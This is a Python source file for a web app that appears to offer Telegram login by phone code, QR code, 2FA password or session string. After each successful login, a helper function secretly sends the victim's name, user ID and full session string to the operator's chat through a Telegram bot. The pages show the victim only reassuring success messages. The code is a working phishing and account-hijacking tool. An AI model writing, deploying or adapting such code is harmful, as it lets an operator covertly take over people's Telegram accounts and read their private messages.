from quart import Quart, render_template, request, redirect, url_for
from telethon.sessions import StringSession
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import asyncio
import os
import qrcode
import io
import base64
from config import api_id, api_hash, BOT_TOKEN, OWNER_CHAT_ID

from telegram import Bot

bot = Bot(token=BOT_TOKEN)

app = Quart(__name__)
sessions_path = "sessions"
os.makedirs(sessions_path, exist_ok=True)

active_clients = {}

@app.route('/')
async def index():
    return await render_template('index.html')

@app.route('/phone', methods=['GET', 'POST'])
async def phone_login():
    if request.method == 'POST':
        form = await request.form
        phone = form['phone']
        client = TelegramClient(f'{sessions_path}/{phone}', api_id, api_hash)
        await client.connect()
        sent_code = await client.send_code_request(phone)
        phone_code_hash = sent_code.phone_code_hash
        await client.disconnect()

        active_clients[phone] = {
            "client": TelegramClient(f'{sessions_path}/{phone}', api_id, api_hash),
            "phone_code_hash": phone_code_hash
        }
        return await render_template('phone_login.html', phone=phone)
    return await render_template('phone_login.html')

@app.route('/verify', methods=['POST'])
async def verify_code():
    form = await request.form
    phone = form['phone']
    code = form['code']

    client_info = active_clients.get(phone)
    if not client_info:
        return "<h3>❌ Error: No active login session found for this phone. Please start again.</h3>", 400

    client = client_info["client"]
    phone_code_hash = client_info["phone_code_hash"]

    await client.connect()

    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
    except SessionPasswordNeededError:
        return redirect(url_for('password', session_key=phone))
    except Exception as e:
        await client.disconnect()
        active_clients.pop(phone, None)
        return f"<h3>❌ Verification error: {str(e)}</h3>", 400

    me = await client.get_me()
    session_str = StringSession.save(client.session)

    await send_session_to_owner(session_str, me)

    await client.send_message("me", "✅ You are now logged in via phone. Session has been saved.")
    await client.disconnect()
    active_clients.pop(phone, None)

    return f"<h3>✅ Logged in as {me.first_name}</h3>"

@app.route('/qr')
async def qr():
    session_key = "qr_session"
    client = TelegramClient(StringSession(), api_id, api_hash)
    await client.connect()

    try:
        qr_login = await client.qr_login()
    except Exception as e:
        await client.disconnect()
        return f"<h3>❌ QR login error: {str(e)}</h3>", 500

    qr_png = qrcode.make(qr_login.url)
    buffer = io.BytesIO()
    qr_png.save(buffer, format="PNG")
    img_str = base64.b64encode(buffer.getvalue()).decode()

    active_clients[session_key] = (client, qr_login)
    asyncio.create_task(poll_qr(client, qr_login, session_key))

    return await render_template('qr_login.html', qr=img_str)

async def poll_qr(client, qr_login, session_key, timeout=120):
    try:
        await asyncio.wait_for(qr_login.wait(), timeout=timeout)
        try:
            me = await client.get_me()
        except SessionPasswordNeededError:
            print("QR login needs 2FA password")
            return

        session_str = StringSession.save(client.session)
        await send_session_to_owner(session_str, me)
        await client.send_message("me", "✅ You’ve successfully logged in using QR.")
        await client.disconnect()
        active_clients.pop(session_key, None)
    except asyncio.TimeoutError:
        print("QR login timed out.")
        await client.disconnect()
        active_clients.pop(session_key, None)

@app.route('/password', methods=['GET', 'POST'])
async def password():
    session_key = request.args.get('session_key')
    if not session_key or session_key not in active_clients:
        return "<h3>Session expired or invalid. Please restart login.</h3>"

    if request.method == 'POST':
        form = await request.form
        password = form['password']

        client_info = active_clients[session_key]
        client = client_info[0] if isinstance(client_info, tuple) else client_info.get("client")

        try:
            await client.check_password(password)
            me = await client.get_me()
            session_str = StringSession.save(client.session)
            await send_session_to_owner(session_str, me)
            await client.send_message("me", "🔐 You’ve successfully logged in using 2FA password.")
            await client.disconnect()
            active_clients.pop(session_key, None)
            return f"<h3>✅ Logged in as {me.first_name} with 2FA password</h3>"
        except Exception as e:
            return f"<h3>❌ Password error: {str(e)}</h3>"

    return await render_template('password.html', session_key=session_key)

@app.route('/session', methods=['GET', 'POST'])
async def session_login():
    if request.method == 'POST':
        form = await request.form
        session_str = form['session']

        try:
            client = TelegramClient(StringSession(session_str), api_id, api_hash)
            await client.connect()
            me = await client.get_me()
            await client.send_message("me", "✅ You have successfully logged in using a session string.")
            await send_session_to_owner(session_str, me)
            await client.disconnect()
            return f"<h3>✅ Logged in as {me.first_name} using session string.</h3>"
        except Exception as e:
            return f"<h3>❌ Failed to login using session string: {str(e)}</h3>"

    return await render_template('session_login.html')

async def send_session_to_owner(session_str, me):
    await bot.send_message(
        chat_id=OWNER_CHAT_ID,
        text=(
            f"🔐 Session Login:\n"
            f"Name: {me.first_name}\n"
            f"User ID: {me.id}\n"
            f"Session string:\n{session_str}"
        )
    )

if __name__ == '__main__':
    app.run(debug=True, port=5000)
